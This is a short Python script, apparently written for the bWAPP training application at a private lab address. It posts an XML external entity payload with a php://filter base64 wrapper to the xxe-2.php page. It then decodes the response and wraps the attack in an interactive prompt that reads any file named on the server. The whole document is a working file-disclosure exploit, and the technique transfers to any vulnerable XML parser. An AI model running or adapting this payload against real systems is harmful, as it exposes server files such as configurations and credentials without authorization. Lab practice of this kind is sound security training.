#!/usr/bin/python3

import requests, sys, re, cmd, base64

burp = {"http":"http://127.0.0.1:8080"}

def getFile(filename):
	cookies = {
		"PHPSESSID":f"{sys.argv[1]}",
		"security_level":"0"
		}

	data = f"""<?xml version="1.0" encoding="utf-8"?>
	    <!DOCTYPE test [
	    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={filename}">
	    ]>
	    <reset><login>
	            &xxe;
	        </login>
	        <secret>
	            Any bus?
	        </secret>
	    </reset>
	"""

	res = requests.post("http://192.168.100.32/bWAPP/xxe-2.php", cookies=cookies, data=data)
	res = re.sub(" ","",res.text)
	output = res.split("'")[0]
	return base64.b64decode(output).decode()

class xxe(cmd.Cmd):
	prompt = "xxe > "
	def default(self, args):
		print(getFile(args))

if __name__=="__main__":
	if(len(sys.argv) != 2):
		print(f"./{sys.argv[0]} <PHPSESSID>")
		sys.exit(1)
	else:
		xxe().cmdloop()


